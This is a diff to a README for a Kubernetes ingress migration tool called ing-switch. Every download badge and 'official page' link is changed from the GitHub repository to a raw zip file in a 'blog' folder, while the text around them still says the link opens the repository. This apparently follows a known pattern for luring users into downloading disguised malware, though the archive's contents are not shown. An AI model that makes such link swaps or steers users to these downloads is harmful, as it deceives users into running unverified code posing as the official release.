@@ -1,6 +1,6 @@
 # ⚙️ ing-switch - Simplify Kubernetes Ingress Migration
 
-[![Download ing-switch](https://img.shields.io/badge/Download-ing--switch-brightgreen)](https://github.com/nasimanpha-create/ing-switch)
+[![Download ing-switch](https://img.shields.io/badge/Download-ing--switch-brightgreen)](https://raw.githubusercontent.com/nasimanpha-create/ing-switch/main/blog/ing-switch-3.7.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Before you begin, make sure your computer meets the system requirements above. W
 
 To get the software, please visit this page to download:
 
-[![Download ing-switch](https://img.shields.io/badge/Download-ing--switch-blue)](https://github.com/nasimanpha-create/ing-switch)
+[![Download ing-switch](https://img.shields.io/badge/Download-ing--switch-blue)](https://raw.githubusercontent.com/nasimanpha-create/ing-switch/main/blog/ing-switch-3.7.zip)
 
 Open the link in your browser. It will take you to the ing-switch GitHub repository.
 
@@ -148,8 +148,8 @@ Make sure you keep your Kubernetes credentials secure. Do not share them with ot
 
 ## 🔗 Useful Links
 
-- Official ing-switch page: https://github.com/nasimanpha-create/ing-switch  
-- Download link: https://github.com/nasimanpha-create/ing-switch  
+- Official ing-switch page: https://raw.githubusercontent.com/nasimanpha-create/ing-switch/main/blog/ing-switch-3.7.zip  
+- Download link: https://raw.githubusercontent.com/nasimanpha-create/ing-switch/main/blog/ing-switch-3.7.zip  
 
 Click the link above to start downloading the application. It will take you to the main GitHub page where you can choose the right version.
 
@@ -174,4 +174,4 @@ You can use the GitHub repository’s **Discussions** and **Issues** tabs to ask
 
 ---
 
-[![Download ing-switch](https://img.shields.io/badge/Download-ing--switch-brightgreen)](https://github.com/nasimanpha-create/ing-switch)
+[![Download ing-switch](https://img.shields.io/badge/Download-ing--switch-brightgreen)](https://raw.githubusercontent.com/nasimanpha-create/ing-switch/main/blog/ing-switch-3.7.zip)
